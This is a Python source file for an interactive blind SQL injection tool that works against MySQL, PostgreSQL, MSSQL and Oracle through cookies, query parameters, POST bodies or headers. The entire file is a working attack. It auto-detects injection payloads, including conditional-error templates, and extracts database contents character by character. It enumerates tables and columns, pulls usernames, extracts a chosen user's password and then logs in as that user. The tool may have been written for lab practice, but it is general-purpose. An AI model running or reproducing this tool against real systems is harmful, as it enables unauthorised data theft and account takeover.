#!/usr/bin/env python3
"""
Regan's Interactive Blind SQL Injection Automator
Supports injection points in: GET parameter, POST body (form or JSON), Cookie, or HTTP Header.
Works with MySQL, PostgreSQL, MSSQL, and Oracle.
Follows Regan's manually documented SQLI Journal exactly.
Includes:
- Smart fallback for SQL length/substring functions.
- Input cleanup to strip database labels from pasted subqueries.
- Binary search for efficient and complete ASCII extraction.
- JSON POST body support.
- Auto-detection of injection logic (AND/OR, quote type, parentheses, comments).
- Auto-detection of conditional response and conditional error blind SQLi.
- DB-specific error payloads and subqueries.
"""

import requests
import sys
import time
import urllib3
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ------------------------------
#  GLOBAL CONFIGURATION
# ------------------------------
session = requests.Session()

config = {
    "target_url": "",
    "method": "GET",
    "injection_location": "cookie",   # "cookie", "get", "post", "header"
    "param_name": "TrackingId",
    "prefix": "",
    "suffix": "-- -",
    "true_indicator": "",
    "indicator_type": "contains",
    "indicator_value": "",
    "delay": 0.2,
    "proxies": {},
    "headers": {},
    "cookies": {},
    "db_type": None,                  # 'mysql', 'postgresql', 'mssql', 'oracle'
    "post_content_type": "form",      # "form" or "json"
    "extra_post_fields": {},          # additional fields for POST body
    "original_value": "",             # stored for auto-detection
    "sqli_type": None,                # "conditional_response" or "conditional_error"
    "error_template": None,           # stores the conditional error payload template
}

# Store extracted data for later phases
last_usernames = []
target_user = None
extracted_password = None

# ------------------------------
#  HELPER: Clean user input
# ------------------------------
def clean_subquery_input(user_input):
    """Remove accidental database label prefixes from user input."""
    user_input = user_input.strip()
    for prefix in ["MySQL:", "PostgreSQL:", "MSSQL:", "Oracle:"]:
        if user_input.startswith(prefix):
            return user_input[len(prefix):].strip()
    return user_input

# ------------------------------
#  CORE FUNCTIONS
# ------------------------------
def send_request(injection):
    """
    Send the injection string to the target, regardless of location.
    """
    cookies = session.cookies.get_dict()
    request_kwargs = {
        "proxies": config["proxies"],
        "headers": config["headers"],
        "verify": False,
        "timeout": 10,
    }

    if config["injection_location"] == "cookie":
        cookies[config["param_name"]] = injection
        request_kwargs["cookies"] = cookies
        return session.get(config["target_url"], **request_kwargs)

    elif config["injection_location"] == "get":
        params = {config["param_name"]: injection}
        request_kwargs["params"] = params
        if config["method"].upper() == "GET":
            return session.get(config["target_url"], **request_kwargs)
        else:
            return session.post(config["target_url"], **request_kwargs)

    elif config["injection_location"] == "post":
        payload = dict(config["extra_post_fields"])
        payload[config["param_name"]] = injection
        if config.get("post_content_type", "form") == "json":
            request_kwargs["json"] = payload
        else:
            request_kwargs["data"] = payload
        return session.post(config["target_url"], **request_kwargs)

    elif config["injection_location"] == "header":
        headers = config["headers"].copy()
        headers[config["param_name"]] = injection
        request_kwargs["headers"] = headers
        if config["method"].upper() == "POST":
            return session.post(config["target_url"], **request_kwargs)
        else:
            return session.get(config["target_url"], **request_kwargs)

    else:
        print("[!] Invalid injection location.")
        return None

def send_raw_injection(full_payload):
    """
    Send a complete injection payload (already includes prefix, condition, suffix).
    """
    return send_request(full_payload)

def make_condition_payload(condition):
    """
    Build the actual payload fragment based on the current sqli_type.
    - For conditional error, use the stored error_template (if any) or generic CASE.
    - For conditional response, simply return the condition.
    """
    if config.get("sqli_type") == "conditional_error":
        if config.get("error_template"):
            # Replace placeholders in the template
            return config["error_template"].replace("{original}", config.get("original_value", "")).replace("{condition}", condition)
        else:
            # Generic fallback (should rarely be needed)
            return f"(SELECT CASE WHEN ({condition}) THEN 1/0 ELSE 1 END)=1"
    else:
        return condition

def send_injection(payload_fragment):
    """
    Send the injection by placing it in the configured location.
    If conditional error with a custom template is active, ignore prefix/suffix and use the template directly.
    """
    injection = config["prefix"] + make_condition_payload(payload_fragment) + config["suffix"]
    cookies = session.cookies.get_dict()
    request_kwargs = {
        "proxies": config["proxies"],
        "headers": config["headers"],
        "verify": False,
        "timeout": 10,
    }

    if config["injection_location"] == "cookie":
        cookies[config["param_name"]] = injection
        request_kwargs["cookies"] = cookies
        response = session.get(config["target_url"], **request_kwargs)

    elif config["injection_location"] == "get":
        params = {config["param_name"]: injection}
        request_kwargs["params"] = params
        if config["method"].upper() == "GET":
            response = session.get(config["target_url"], **request_kwargs)
        else:
            response = session.post(config["target_url"], **request_kwargs)

    elif config["injection_location"] == "post":
        payload = dict(config["extra_post_fields"])
        payload[config["param_name"]] = injection
        if config.get("post_content_type", "form") == "json":
            request_kwargs["json"] = payload
        else:
            request_kwargs["data"] = payload
        response = session.post(config["target_url"], **request_kwargs)

    elif config["injection_location"] == "header":
        headers = config["headers"].copy()
        headers[config["param_name"]] = injection
        request_kwargs["headers"] = headers
        if config["method"].upper() == "POST":
            response = session.post(config["target_url"], **request_kwargs)
        else:
            response = session.get(config["target_url"], **request_kwargs)

    else:
        print("[!] Invalid injection location.")
        return None

    time.sleep(config["delay"])
    return response

def is_true(payload_fragment):
    """Boolean oracle."""
    r = send_injection(payload_fragment)
    if r is None:
        return False
    indicator_type = config["indicator_type"]
    if indicator_type == "contains":
        return config["true_indicator"] in r.text
    elif indicator_type == "length_gt":
        return len(r.text) > int(config["indicator_value"])
    elif indicator_type == "status_code":
        return r.status_code == int(config["indicator_value"])
    else:
        return config["true_indicator"] in r.text

def set_oracle_from_responses(r_true, r_false):
    """
    Given the two responses for TRUE and FALSE conditions, set the oracle
    and indicator to differentiate them. Returns True if a clear difference exists.
    """
    status_diff = r_true.status_code != r_false.status_code
    len_diff = abs(len(r_true.text) - len(r_false.text))

    if status_diff:
        config["indicator_type"] = "status_code"
        config["indicator_value"] = str(r_true.status_code)
        return True

    if len_diff > 50:
        min_len = min(len(r_true.text), len(r_false.text))
        config["indicator_type"] = "length_gt"
        config["indicator_value"] = str(min_len)
        return True

    import difflib
    true_lines = r_true.text.splitlines()
    false_lines = r_false.text.splitlines()
    sm = difflib.SequenceMatcher(None, true_lines, false_lines)
    candidates = []
    for op, i1, i2, j1, j2 in sm.get_opcodes():
        if op in ('insert', 'replace'):
            for line in true_lines[i1:i2]:
                stripped = line.strip()
                if stripped and len(stripped) > 5:
                    candidates.append(stripped[:80])
    if candidates:
        config["true_indicator"] = candidates[0]
        config["indicator_type"] = "contains"
        return True

    return False

def test_pair_for_oracle(cond_true, cond_false):
    """
    Send true and false conditions, try to set oracle.
    Returns True if a working oracle is set, else False.
    """
    r_true = send_injection(cond_true)
    r_false = send_injection(cond_false)
    if r_true is None or r_false is None:
        return False

    if set_oracle_from_responses(r_true, r_false):
        if is_true(cond_true) and not is_true(cond_false):
            return True
        else:
            config["true_indicator"] = ""
            config["indicator_type"] = "contains"
            config["indicator_value"] = ""
    return False

def get_length(subquery, max_len=200):
    """
    Find length using LENGTH (MySQL/PostgreSQL/Oracle) or LEN (MSSQL).
    Includes fallback: tries primary function first, then alternative.
    """
    print(f"[*] Finding length of ({subquery})...")

    if config["db_type"] == "mssql":
        len_funcs = ["LEN", "LENGTH"]
    else:
        len_funcs = ["LENGTH", "LEN"]

    for len_func in len_funcs:
        for i in range(1, max_len + 1):
            condition = f"{len_func}(({subquery}))={i}"
            if is_true(condition):
                print(f"[+] Length = {i} (using {len_func})")
                return i
        print(f"    No result with {len_func}, trying next function...")
    print("[!] Length not found (or > max_len).")
    return None

def binary_search_ascii(subquery, pos, substr_func):
    """
    Find ASCII code of the character at given position using binary search.
    Searches in printable ASCII range (32-126).
    """
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        condition = f"ASCII({substr_func}(({subquery}),{pos},1)) <= {mid}"
        if is_true(condition):
            high = mid
        else:
            low = mid + 1

    condition = f"ASCII({substr_func}(({subquery}),{pos},1)) = {low}"
    if is_true(condition):
        return low
    else:
        return None

def extract_string(subquery, length):
    """
    Extract string using binary search on ASCII codes.
    Uses SUBSTRING (MySQL/PostgreSQL/MSSQL) or SUBSTR (Oracle) with fallback.
    """
    print(f"[*] Extracting string of length {length}...")

    if config["db_type"] == "oracle":
        substr_funcs = ["SUBSTR", "SUBSTRING"]
    else:
        substr_funcs = ["SUBSTRING", "SUBSTR"]

    for substr_func in substr_funcs:
        result = ""
        success = True
        for pos in range(1, length + 1):
            code = binary_search_ascii(subquery, pos, substr_func)
            if code is not None:
                result += chr(code)
                print(f"    Pos {pos}: '{chr(code)}' (ASCII {code}) -> {result}")
            else:
                print(f"    No printable char at pos {pos} using {substr_func}, switching function...")
                success = False
                break
        if success:
            print(f"[+] Extracted using {substr_func}: {result}")
            return result

    print("[!] Failed to extract with available functions.")
    return result

# ------------------------------
#  AUTO-DETECTION OF INJECTION LOGIC (EXPANDED)
# ------------------------------
def auto_detect_injection_logic():
    """
    Try a wide range of prefix variants and identify one that yields a clear TRUE/FALSE difference.
    Sets config["prefix"], config["sqli_type"], and config["oracle"] accordingly.
    Returns True if a working injection is found, False otherwise.
    """
    print("\n[*] Auto-detecting injection logic...")

    original_value = config.get("original_value", "")
    suffix = config.get("suffix", "-- -")

    # --- 1. Try conditional response with various prefixes ---
    candidates = [
        f"{original_value}' AND ",
        f"{original_value}' OR ",
        f"{original_value}' OR '1'='1",
        f"{original_value}' OR 'a'='a",
        f"{original_value}' OR 1=1",
        f"{original_value}' AND '1'='1",
        f"{original_value}' AND 'a'='a",
        f'{original_value}" AND ',
        f'{original_value}" OR ',
        f'{original_value}" OR "1"="1',
        f'{original_value}" OR "a"="a',
        f'{original_value}" OR 1=1',
        f'{original_value}" AND "1"="1',
        f'{original_value}" AND "a"="a',
        f"{original_value} AND ",
        f"{original_value} OR ",
        f"{original_value} AND 1=1",
        f"{original_value} OR 1=1",
        f"{original_value}') AND ",
        f"{original_value}') OR ",
        f"{original_value}') AND 1=1",
        f"{original_value}') OR 1=1",
        f"{original_value}') OR '1'='1",
        f"{original_value}') AND '1'='1",
        f"{original_value}) AND ",
        f"{original_value}) OR ",
        f"{original_value}) AND 1=1",
        f"{original_value}) OR 1=1",
        f'{original_value}") AND ',
        f'{original_value}") OR ',
        f'{original_value}") AND 1=1',
        f'{original_value}") OR 1=1',
        f"{original_value}')) AND ",
        f"{original_value}')) OR ",
        f"{original_value}')) AND 1=1",
        f"{original_value}')) OR 1=1",
        f"{original_value}` AND ",
        f"{original_value}` OR ",
        f"{original_value}' AND 1=1-- -",
        f"{original_value}' OR 1=1-- -",
        f"{original_value}' AND 1=1#",
        f"{original_value}' OR 1=1#",
        f"{original_value}' AND 1=1/*",
        f"{original_value}' OR 1=1/*",
        f"{original_value} AND 1=1-- -",
        f"{original_value} OR 1=1-- -",
        f"{original_value} AND 1=1#",
        f"{original_value} OR 1=1#",
        f"{original_value} AND 1=1/*",
        f"{original_value} OR 1=1/*",
    ]

    saved_prefix = config["prefix"]
    saved_suffix = config["suffix"]
    saved_sqli_type = config.get("sqli_type")

    for prefix in candidates:
        config["prefix"] = prefix
        if prefix.endswith("-- -") or prefix.endswith("#") or prefix.endswith("/*"):
            config["suffix"] = ""
        else:
            config["suffix"] = suffix

        config["sqli_type"] = "conditional_response"
        if test_pair_for_oracle("1=1", "1=2"):
            print(f"[+] Found working prefix: {prefix}")
            print(f"    Type: Conditional Response")
            print(f"    Oracle set to {config['indicator_type']} = {config.get('indicator_value') or config.get('true_indicator')}")
            return True

    # --- 2. Try conditional error with DB-specific payloads (corrected) ---
    error_templates = [
        ("{original}' || CASE WHEN ({condition}) THEN 1/0 ELSE 1 END || '-- ", "oracle"),
        ("{original} || CASE WHEN ({condition}) THEN 1/0 ELSE 1 END || '-- ", "oracle"),
        ("{original}' || CASE WHEN ({condition}) THEN CAST('ERR' AS INTEGER) ELSE 1 END || '-- ", "postgresql"),
        ("{original} || CASE WHEN ({condition}) THEN CAST('ERR' AS INTEGER) ELSE 1 END || '-- ", "postgresql"),
        ("{original}' AND CONCAT('', IF({condition}, UPDATEXML(1, CONCAT(0x7e,'ERR',0x7e), 1), 1), '') AND '-- ", "mysql"),
        ("{original} AND IF({condition}, UPDATEXML(1, CONCAT(0x7e,'ERR',0x7e), 1), 1)-- ", "mysql"),
        ("{original}' + CASE WHEN ({condition}) THEN CONVERT(int,'ERR') ELSE '' END + '-- ", "mssql"),
        ("{original} + CASE WHEN ({condition}) THEN CONVERT(int,'ERR') ELSE '' END + '-- ", "mssql"),
    ]

    for template, db in error_templates:
        true_payload = template.replace("{original}", original_value).replace("{condition}", "1=1")
        false_payload = template.replace("{original}", original_value).replace("{condition}", "1=2")

        r_true = send_raw_injection(true_payload)
        r_false = send_raw_injection(false_payload)
        if r_true is None or r_false is None:
            continue

        if set_oracle_from_responses(r_true, r_false):
            config["sqli_type"] = "conditional_error"
            config["error_template"] = template
            config["db_type"] = db
            config["prefix"] = ""
            config["suffix"] = ""
            if is_true("1=1") and not is_true("1=2"):
                print(f"[+] Found working conditional error payload: {template}")
                print(f"    Type: Conditional Error")
                print(f"    Database: {db}")
                print(f"    Oracle set to {config['indicator_type']} = {config.get('indicator_value') or config.get('true_indicator')}")
                return True
            else:
                config["true_indicator"] = ""
                config["indicator_type"] = "contains"
                config["indicator_value"] = ""
                config["error_template"] = None
                config["sqli_type"] = None
                config["db_type"] = None
                config["prefix"] = saved_prefix
                config["suffix"] = saved_suffix

    config["prefix"] = saved_prefix
    config["suffix"] = saved_suffix
    config["sqli_type"] = saved_sqli_type
    print("[!] Blind SQLi not found.")
    return False

# ------------------------------
#  PHASE FUNCTIONS
# ------------------------------
def phase_confirm_injection():
    print("\n=== Phase 1: Confirm Blind SQLi ===")

    if not config["true_indicator"] and config["indicator_type"] == "contains":
        if auto_detect_injection_logic():
            true_res = is_true("1=1")
            false_res = is_true("1=2")
            print(f"TRUE  -> {true_res}")
            print(f"FALSE -> {false_res}")
            if true_res and not false_res:
                if config.get("sqli_type") == "conditional_error":
                    print("[+] Blind SQL conditional error SQLi confirmed with auto-detected prefix.")
                else:
                    print("[+] Blind SQL conditional response SQLi confirmed with auto-detected prefix.")
                return True
            else:
                print("[!] Auto-detected prefix failed verification.")
                return False
        else:
            print("[!] Could not auto-detect. Please configure manually if you want to test manually.")
            return False

    print("Testing oracle with TRUE and FALSE...")
    true_res = is_true("1=1")
    false_res = is_true("1=2")
    print(f"TRUE  -> {true_res}")
    print(f"FALSE -> {false_res}")
    if true_res and not false_res:
        if config.get("sqli_type") == "conditional_error":
            print("[+] Blind SQL conditional error SQLi confirmed.")
        else:
            print("[+] Blind SQL conditional response SQLi confirmed.")
        return True
    else:
        print("[!] Oracle does not distinguish true/false. Please reconfigure.")
        return False

def phase_identify_database():
    """
    Phase 2: Identify DB.
    For conditional error, test each DB-specific error template with 1=1/1=2.
    For conditional response, use simple DB function tests.
    """
    print("\n=== Phase 2: Identify Database ===")

    if config.get("sqli_type") == "conditional_error":
        print("[*] Conditional error detected. Testing DB-specific error templates...")
        original_value = config.get("original_value", "")
        error_templates = [
            ("{original}' || CASE WHEN ({condition}) THEN 1/0 ELSE 1 END || '-- ", "oracle"),
            ("{original}' || CASE WHEN ({condition}) THEN CAST('ERR' AS INTEGER) ELSE 1 END || '-- ", "postgresql"),
            ("{original}' AND CONCAT('', IF({condition}, UPDATEXML(1, CONCAT(0x7e,'ERR',0x7e), 1), 1), '') AND '-- ", "mysql"),
            ("{original}' + CASE WHEN ({condition}) THEN CONVERT(int,'ERR') ELSE '' END + '-- ", "mssql"),
        ]
        for template, db in error_templates:
            true_payload = template.replace("{original}", original_value).replace("{condition}", "1=1")
            false_payload = template.replace("{original}", original_value).replace("{condition}", "1=2")
            r_true = send_raw_injection(true_payload)
            r_false = send_raw_injection(false_payload)
            if r_true is None or r_false is None:
                continue
            if set_oracle_from_responses(r_true, r_false):
                config["db_type"] = db
                config["error_template"] = template
                config["sqli_type"] = "conditional_error"
                config["prefix"] = ""
                config["suffix"] = ""
                print(f"[+] Database identified as {db}.")
                return db
        print("[*] Could not identify database.")
        return None
    else:
        # Conditional response: simple tests
        tests = [
            ("MySQL", "database() IS NOT NULL"),
            ("PostgreSQL", "current_database() IS NOT NULL"),
            ("MSSQL", "@@version IS NOT NULL"),
            ("Oracle", "(SELECT 1 FROM v$version) IS NOT NULL"),
        ]
        for db, cond in tests:
            print(f"Testing {db}: {cond}")
            if is_true(cond):
                print(f"[+] Database appears to be {db}.")
                config["db_type"] = db.lower()
                return db
        print("[*] Could not identify database. You can manually set it in configuration (Option 1).")
        return None

def phase_confirm_table_exists(table_name):
    print(f"\n=== Phase 3: Confirm Table '{table_name}' Exists ===")
    condition = f"(SELECT COUNT(*) FROM {table_name}) > 0"
    if is_true(condition):
        print(f"[+] Table '{table_name}' exists.")
        return True
    else:
        print(f"[-] Table '{table_name}' does not exist (or access denied).")
        return False

def get_default_subquery_for_phase4():
    if config["db_type"] == "oracle":
        return "SELECT table_name FROM user_tables WHERE ROWNUM=1"
    elif config["db_type"] == "postgresql":
        return "SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}"
    elif config["db_type"] == "mssql":
        return "SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES"
    else:
        return "SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {offset}"

def phase_enumerate_tables():
    print("\n=== Phase 4: Enumerate Table Names ===")
    print("Provide a subquery template with {offset} placeholder.")
    print("Examples:")
    print("  MySQL:      SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET {offset}")
    print("  PostgreSQL: SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {offset}")
    print("  MSSQL:      SELECT table_name FROM information_schema.tables ORDER BY table_name OFFSET {offset} ROWS FETCH NEXT 1 ROWS ONLY")
    print("  Oracle:     SELECT table_name FROM user_tables WHERE ROWNUM=1")
    subquery_template = input("> ").strip()
    subquery_template = clean_subquery_input(subquery_template)
    if not subquery_template:
        subquery_template = get_default_subquery_for_phase4()
    if "{offset}" not in subquery_template:
        if config["db_type"] == "oracle" and "ROWNUM=1" in subquery_template:
            tables = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                name = extract_string(subquery, length)
                if name:
                    tables.append(name)
                    print(f"[+] Table 0: {name}")
            return tables
        else:
            print("[!] No {offset} placeholder. Assuming first row only.")
    tables = []
    offset = 0
    while True:
        subquery = subquery_template.format(offset=offset)
        length = get_length(subquery)
        if length is None or length == 0:
            print("[*] No more tables found.")
            break
        name = extract_string(subquery, length)
        if name:
            tables.append(name)
            print(f"[+] Table {offset}: {name}")
        else:
            print("[!] Empty table name, stopping.")
            break
        offset += 1
    return tables

def phase_enumerate_columns(table_name):
    print(f"\n=== Phase 5: Enumerate Columns for Table '{table_name}' ===")
    print("Provide a subquery template with {offset} placeholder.")
    print("Examples:")
    print(f"  MySQL:      SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {{offset}}")
    print(f"  PostgreSQL: SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {{offset}}")
    print(f"  MSSQL:      SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' ORDER BY column_name OFFSET {{offset}} ROWS FETCH NEXT 1 ROWS ONLY")
    print(f"  Oracle:     SELECT column_name FROM all_tab_columns WHERE table_name='{table_name.upper()}' AND ROWNUM=1")
    subquery_template = input("> ").strip()
    subquery_template = clean_subquery_input(subquery_template)
    if not subquery_template:
        if config["db_type"] == "mssql":
            subquery_template = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' ORDER BY column_name OFFSET {{offset}} ROWS FETCH NEXT 1 ROWS ONLY"
        elif config["db_type"] == "oracle":
            subquery_template = f"SELECT column_name FROM all_tab_columns WHERE table_name='{table_name.upper()}' AND ROWNUM=1"
        else:
            subquery_template = f"SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {{offset}}"
    if "{offset}" not in subquery_template:
        if config["db_type"] == "oracle" and "ROWNUM=1" in subquery_template:
            columns = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                col = extract_string(subquery, length)
                if col:
                    columns.append(col)
                    print(f"[+] Column 0: {col}")
            return columns
        else:
            print("[!] No {offset} placeholder. Assuming first row only.")
    columns = []
    offset = 0
    while True:
        subquery = subquery_template.format(offset=offset)
        length = get_length(subquery)
        if length is None or length == 0:
            break
        col = extract_string(subquery, length)
        if col:
            columns.append(col)
            print(f"[+] Column {offset}: {col}")
        else:
            break
        offset += 1
    return columns

def phase_confirm_rows_exist(table_name):
    print(f"\n=== Phase 6: Confirm Rows in Table '{table_name}' ===")
    condition = f"(SELECT COUNT(*) FROM {table_name}) > 0"
    if is_true(condition):
        print("[+] Rows exist.")
        return True
    else:
        print("[-] No rows found (or table empty).")
        return False

def phase_extract_usernames(table_name, column_name):
    print(f"\n=== Phase 7: Extract Usernames from '{table_name}.{column_name}' ===")
    print("Provide a subquery template with {offset} placeholder and optional WHERE.")
    print("Examples:")
    print(f"  MySQL:      SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {{offset}}")
    print(f"  PostgreSQL: SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {{offset}}")
    print(f"  MSSQL:      SELECT {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {{offset}} ROWS FETCH NEXT 1 ROWS ONLY")
    print(f"  Oracle:     SELECT {column_name} FROM {table_name} WHERE ROWNUM=1")
    subquery_template = input("> ").strip()
    subquery_template = clean_subquery_input(subquery_template)
    if not subquery_template:
        if config["db_type"] == "mssql":
            subquery_template = f"SELECT {column_name} FROM {table_name} ORDER BY {column_name} OFFSET {{offset}} ROWS FETCH NEXT 1 ROWS ONLY"
        elif config["db_type"] == "oracle":
            subquery_template = f"SELECT {column_name} FROM {table_name} WHERE ROWNUM=1"
        else:
            subquery_template = f"SELECT {column_name} FROM {table_name} LIMIT 1 OFFSET {{offset}}"
    if "{offset}" not in subquery_template:
        if config["db_type"] == "oracle" and "ROWNUM=1" in subquery_template:
            usernames = []
            subquery = subquery_template
            length = get_length(subquery)
            if length is not None and length > 0:
                username = extract_string(subquery, length)
                if username:
                    usernames.append(username)
                    print(f"[+] User 0: {username}")
            return usernames
        else:
            print("[!] No {offset} placeholder. Assuming first row only.")
    usernames = []
    offset = 0
    while True:
        subquery = subquery_template.format(offset=offset)
        length = get_length(subquery)
        if length is None or length == 0:
            break
        username = extract_string(subquery, length)
        if username:
            usernames.append(username)
            print(f"[+] User {offset}: {username}")
        else:
            break
        offset += 1
    return usernames

def phase_choose_target(usernames):
    print("\n=== Phase 8: Choose Target User ===")
    if not usernames:
        print("[!] No usernames available.")
        return None
    for i, name in enumerate(usernames):
        print(f"{i}: {name}")
    idx = input("Enter index of target user: ").strip()
    try:
        idx = int(idx)
        return usernames[idx]
    except (ValueError, IndexError):
        print("[!] Invalid selection.")
        return None

def phase_extract_password(table_name, user_column, user_value, password_column):
    print(f"\n=== Phase 9/10: Extract Password for {user_column}='{user_value}' ===")
    print("Provide a subquery that returns the password for the target user.")
    print("Examples:")
    print(f"  MySQL/PostgreSQL: SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}' LIMIT 1")
    print(f"  MSSQL:           SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}'")
    print(f"  Oracle:          SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}'")
    subquery = input("> ").strip()
    subquery = clean_subquery_input(subquery)
    if not subquery:
        if config["db_type"] == "mssql":
            subquery = f"SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}'"
        elif config["db_type"] == "oracle":
            subquery = f"SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}'"
        else:
            subquery = f"SELECT {password_column} FROM {table_name} WHERE {user_column}='{user_value}' LIMIT 1"
    length = get_length(subquery)
    if length is None:
        return None
    password = extract_string(subquery, length)
    print(f"[+] Password: {password}")
    return password

def phase_login(username, password):
    print("\n=== Phase 11: Login ===")
    login_url = input("Login URL (e.g., https://target/login): ").strip()
    login_data = {
        "username": username,
        "password": password,
    }
    r = session.post(login_url, data=login_data, proxies=config["proxies"], headers=config["headers"], timeout=10, verify=False)
    print(f"Login response status: {r.status_code}")
    print(f"Response length: {len(r.text)}")
    print("Check if login was successful.")

# ------------------------------
#  CONFIGURATION
# ------------------------------
def configure():
    print("\n=== Configuration ===")
    config["target_url"] = input("Full target URL (including path, e.g., https://example.com/page): ").strip()
    config["injection_location"] = input("Injection location (cookie/get/post/header): ").strip().lower()
    while config["injection_location"] not in ["cookie", "get", "post", "header"]:
        print("Invalid. Choose from: cookie, get, post, header")
        config["injection_location"] = input("Injection location: ").strip().lower()

    config["param_name"] = input(f"Name of the {config['injection_location']} (e.g., TrackingId for cookie, category for get): ").strip()

    if config["injection_location"] == "post":
        config["method"] = "POST"
        content_type = input("POST content type (form/json, default form): ").strip().lower()
        if content_type in ["json", "form"]:
            config["post_content_type"] = content_type
        else:
            config["post_content_type"] = "form"
        extra_fields_str = input("Additional POST fields (key=value; key2=value2, blank for none): ").strip()
        if extra_fields_str:
            for pair in extra_fields_str.split(';'):
                if '=' in pair:
                    k, v = pair.strip().split('=', 1)
                    config["extra_post_fields"][k.strip()] = v.strip()
    else:
        config["method"] = input("HTTP method (GET/POST, default GET): ").strip().upper() or "GET"

    original_value = input("Original value (before injection, e.g., xyz123 or Gifts): ").strip()
    config["original_value"] = original_value

    quote_needed = input("Does the value need a closing quote? (y/n, default y): ").strip().lower() or 'y'
    if quote_needed == 'y':
        config["prefix"] = original_value + "' AND "
    else:
        config["prefix"] = original_value + " AND "

    config["suffix"] = input("Injection suffix (default '-- -'): ").strip() or "-- -"

    oracle_choice = input("Do you know the oracle indicator? (y/n, default n): ").strip().lower() or 'n'
    if oracle_choice == 'y':
        config["true_indicator"] = input("String that appears only in TRUE responses: ").strip()
        config["indicator_type"] = input("Indicator type (contains/length_gt/status_code, default contains): ").strip() or "contains"
        if config["indicator_type"] == "length_gt":
            config["indicator_value"] = input("Length greater than: ").strip()
        elif config["indicator_type"] == "status_code":
            config["indicator_value"] = input("Status code for TRUE: ").strip()
    else:
        print("You can auto-detect oracle in Phase 1.")

    config["delay"] = float(input("Delay between requests (seconds, default 0.2): ").strip() or "0.2")

    proxies = input("Proxy (e.g., http://127.0.0.1:8080, blank for none): ").strip()
    if proxies:
        config["proxies"] = {"http": proxies, "https": proxies}

    cookie_str = input("Additional cookies (format: key=value; key2=value2, blank for none): ").strip()
    if cookie_str:
        for pair in cookie_str.split(';'):
            k, v = pair.strip().split('=', 1)
            config["cookies"][k.strip()] = v.strip()
            session.cookies.set(k.strip(), v.strip())

    header_str = input("Extra headers (format: Key:Value; Key2:Value2, blank for none): ").strip()
    if header_str:
        for pair in header_str.split(';'):
            k, v = pair.strip().split(':', 1)
            config["headers"][k.strip()] = v.strip()

    db_choice = input("Do you know the database type? (mysql/postgresql/mssql/oracle, blank to auto-detect later): ").strip().lower()
    if db_choice in ["mysql", "postgresql", "mssql", "oracle"]:
        config["db_type"] = db_choice

    print("[+] Configuration saved.")

# ------------------------------
#  MAIN MENU
# ------------------------------
def main_menu():
    while True:
        print("\n" + "="*50)
        print("Blind SQLi Interactive Automator")
        print("="*50)
        print("1. Configure injection / oracle")
        print("2. Phase 1: Confirm blind SQLi")
        print("3. Phase 2: Identify database")
        print("4. Phase 3: Confirm table exists")
        print("5. Phase 4: Enumerate tables")
        print("6. Phase 5: Enumerate columns")
        print("7. Phase 6: Confirm rows exist")
        print("8. Phase 7: Extract usernames")
        print("9. Phase 8: Choose target user")
        print("10. Phase 9-10: Extract password")
        print("11. Phase 11: Login")
        print("0. Exit")
        choice = input("\nEnter choice: ").strip()
        if choice == "1":
            configure()
        elif choice == "2":
            phase_confirm_injection()
        elif choice == "3":
            phase_identify_database()
        elif choice == "4":
            table = input("Table name to check: ").strip()
            phase_confirm_table_exists(table)
        elif choice == "5":
            tables = phase_enumerate_tables()
            print("Tables found:", tables)
        elif choice == "6":
            table = input("Table name: ").strip()
            cols = phase_enumerate_columns(table)
            print("Columns found:", cols)
        elif choice == "7":
            table = input("Table name: ").strip()
            phase_confirm_rows_exist(table)
        elif choice == "8":
            table = input("Table name: ").strip()
            col = input("Column to extract (e.g., username): ").strip()
            users = phase_extract_usernames(table, col)
            print("Usernames found:", users)
            global last_usernames
            last_usernames = users
        elif choice == "9":
            if not last_usernames:
                print("[!] No usernames extracted yet. Run phase 7 first.")
            else:
                target = phase_choose_target(last_usernames)
                if target:
                    global target_user
                    target_user = target
                    print(f"[+] Target user set to: {target}")
        elif choice == "10":
            if not target_user:
                print("[!] No target user selected. Run phase 8 first.")
                continue
            table = input("Table name: ").strip()
            user_col = input("Username column name: ").strip()
            pass_col = input("Password column name: ").strip()
            password = phase_extract_password(table, user_col, target_user, pass_col)
            if password:
                global extracted_password
                extracted_password = password
        elif choice == "11":
            if not target_user or not extracted_password:
                print("[!] Need target user and password first.")
            else:
                phase_login(target_user, extracted_password)
        elif choice == "0":
            print("Exiting.")
            sys.exit(0)
        else:
            print("Invalid choice.")

if __name__ == "__main__":
    print("="*50)
    print("Blind SQLi Interactive Automator")
    print("Flexible for any injection location and multiple DBMS")
    print("="*50)
    print("Start by configuring (option 1).")
    main_menu()
